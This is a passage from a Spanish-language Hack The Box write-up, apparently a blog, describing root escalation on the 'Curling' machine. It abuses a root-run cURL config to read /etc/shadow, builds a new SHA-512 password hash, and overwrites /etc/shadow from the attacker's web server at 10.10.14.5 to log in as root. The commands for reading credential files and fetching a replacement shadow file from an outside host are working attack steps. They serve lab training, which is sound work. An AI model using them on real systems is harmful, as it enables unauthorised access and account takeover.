floris@curling:/tmp/miacosa$ echo 'url = "file:///etc/shadow"'
url = "file:///etc/shadow"
```

Pues hagámoslo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_fileINPUT_originalETCshadow.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y si revisamos el archivo `report`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_fileREPORT_originalETCshadow.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

¡Qué maravillaaaaaaaaaaaaaaaaaaaaaaaaaaa!!

Con esto ya podríamos obtener la `flag` de **root**...

---

## Cambiamos la contraseña de <u>root</u> para obtener una Shell en el sistema [📌](#shadow-root) {#shadow-root}

Probando maneras de obtener una **Shell** con simplemente una subida y modificación de archivos recorde una manera que interactuaba directamente con el archivo `/etc/shadow`, en internet encontramos este post con una explicación brutal:

* [Privilege Escalation: Exploiting write access to /etc/shadow](https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html).

**Visiten el post, esta muy bueno y explica muuuchas cosas que no tocaré acá.**

(En pocas palabras)...

Una credencial del archivo `/etc/shadow` normalmente tiene este formato:

```bash
test:x:1002:1002:test,,,:/test:/bin/bash
```

Donde de todos los campos (separados por `:`) el que contiene la contraseña en este ejemplo es `x`. Pero **OJOOOOOOOOO**, la contraseña no es `x` (por si no me hice entender) 🤪, donde esta la `x` va el hash de la contraseña...

Entonces, la explotación se basa en **remplazar** el `hash` (la contraseña) de algún usuario con uno nuevo queeeeee haga referencia a una contraseña que conozcamos (obvio :P).

Esto para iniciar sesión con esa nueva contraseña contra el usuario al que le cambiamos su `hash` (contraseña).

Veámoslo en la práctica.

Tomamos el contenido original del archivo `/etc/shadow`. Aprovechemos el archivo de configuración para indicarle que nos guarde el resultado de la petición en otro archivo:

```bash
floris@curling:/tmp/miacosa$ echo -e 'url = "file:///etc/shadow"\n-o /tmp/miacosa/shasha'
url = "file:///etc/shadow"
-o /tmp/miacosa/shasha
```

```bash
floris@curling:/tmp/miacosa$ echo -e 'url = "file:///etc/shadow"\n-o /tmp/miacosa/shasha' > /home/floris/admin-area/input
```

Esperamos un momento y ya tendríamos el archivo `shasha` en nuestra carpeta de trabajo, (de todas las formas en que podemos pasarnos el archivo) tomamos su contenido, nos lo llevamos a nuestra máquina y generamos un nuevo archivo con él:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_transport_ORIGINALshadowFILE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y ahora nos queda identificar que tipo de hash tiene el usuario `root` para así mismo generar el nuestro con el formato correcto:

```bash
root:$6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1:17673:0:99999:7:::
...
```

En el mismo post nos indica:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_shadow_typeHASH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Así que el algoritmo usado es `SHA-512`, encontramos estas maneras de generarlos desde consola:

* [How to create SHA512/SHA256/MD5 password hashes on command line](https://rakeshjain-devops.medium.com/how-to-create-sha512-sha256-md5-password-hashes-on-command-line-2223db20c08c).
* [How to create SHA512 password hashes on command line](https://unix.stackexchange.com/questions/52108/how-to-create-sha512-password-hashes-on-command-line#answer-76337).

Nos quedaremos con esta manera:

```bash
❱ python3 -c 'import crypt; print(crypt.crypt("hola", crypt.mksalt(crypt.METHOD_SHA512)))'
```

Donde `hola` es la "contraseña" que queremos encriptar, pues generemos el hash para `ajatepille`:

```bash
❱ python3 -c 'import crypt; print(crypt.crypt("ajatepille", crypt.mksalt(crypt.METHOD_SHA512)))'
$6$4iWM54cNAlfhQmjI$ZXyO9QTKqY0iXUwcliHzZ.o8LjNyj.l9ZS6iw0gv7hj1vuUp2LwBykBkE2GFjsvggl2CA4HQInUCVYap6WznA0
```

Perfectísimo, lo siguiente será remplazar la contraseña de `root` por la nueva:

```bash
root:$6$4iWM54cNAlfhQmjI$ZXyO9QTKqY0iXUwcliHzZ.o8LjNyj.l9ZS6iw0gv7hj1vuUp2LwBykBkE2GFjsvggl2CA4HQInUCVYap6WznA0:17673:0:99999:7:::
...
```

Y como paso final debemos indicarle a la instrucción `cURL` que tome ese contenido y lo remplacé por el actual:

(**Levantamos un servidor web en la ruta donde esté el archivo `shadow`**)

```bash
❱ python3 -m http.server
```

Y en el objeto `input` indicamos:

```bash
floris@curling:/tmp/miacosa$ echo -e 'url = "http://10.10.14.5:8000/shadow"\n-o /etc/shadow'
url = "http://10.10.14.5:8000/shadow"
-o /etc/shadow
```

```bash
floris@curling:/tmp/miacosa$ echo -e 'url = "http://10.10.14.5:8000/shadow"\n-o /etc/shadow' > /home/floris/admin-area/input 
```

Nos llegara la petición, leerá el contenido del archivo hosteado (`shadow`) y lo guardara en la ruta `/etc/shadow`, o sea, el nuevo archivo será el que contiene nuestra contraseña (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_transport_FAKEshadowFILE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

YyyyyyyyyyyyYYYyyyYyyy si ahora intentamos conectarnos como `root` con la contraseña `ajatepille`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_rootSH_su.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VAMOOOOOOOOOOOOOOONOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOS!! Conseguimos una **Shell** como el usuario `root` cambiándole su contraseña, que belleza!!

Veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y eso es todo por esta máquina :(:(:(:(:

...

Bonito camino, lo de encontrar `secret.txt` así como así en un comentario fue muy KLK, pero de resto fue de mucho aprendizaje.

Y weno, nos reencontraremos en otra ocasión, a darle duro a todo yyyyyyyyyyyyyyyyyyy a seguir rompiendoOOO0oOOOOOOoooooTODOOOOOOOOooooOO!!